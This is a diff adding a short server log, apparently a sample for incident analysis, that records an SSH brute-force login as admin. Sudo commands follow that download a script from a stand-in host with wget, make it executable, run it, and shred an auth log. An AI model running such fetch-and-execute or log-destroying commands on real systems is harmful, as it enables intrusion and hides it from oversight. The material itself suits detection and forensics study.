@@ -1,0 +1,13 @@
+2026-10-12 08:01:14 INFO  sshd[1022]: Accepted publickey for jdoe from 10.20.4.17 port 51822
+2026-10-12 08:15:42 INFO  cron[1310]: (root) CMD (/usr/local/bin/backup.sh)
+2026-10-12 09:02:03 WARN  sshd[1408]: Failed password for root from 185.220.101.44 port 40112
+2026-10-12 09:02:05 WARN  sshd[1408]: Failed password for root from 185.220.101.44 port 40114
+2026-10-12 09:02:08 WARN  sshd[1408]: Failed password for root from 185.220.101.44 port 40118
+2026-10-12 09:02:11 WARN  sshd[1408]: Failed password for admin from 185.220.101.44 port 40121
+2026-10-12 09:02:19 INFO  sshd[1408]: Accepted password for admin from 185.220.101.44 port 40125
+2026-10-12 09:03:40 INFO  sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.9/x.sh -O /tmp/.x.sh
+2026-10-12 09:03:52 INFO  sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x.sh
+2026-10-12 09:04:01 INFO  sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/tmp/.x.sh
+2026-10-12 09:06:30 INFO  sudo: admin : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1
+2026-10-12 10:30:00 INFO  cron[1310]: (root) CMD (/usr/local/bin/backup.sh)
+2026-10-12 11:47:21 INFO  sshd[2204]: Accepted publickey for jdoe from 10.20.4.17 port 52210
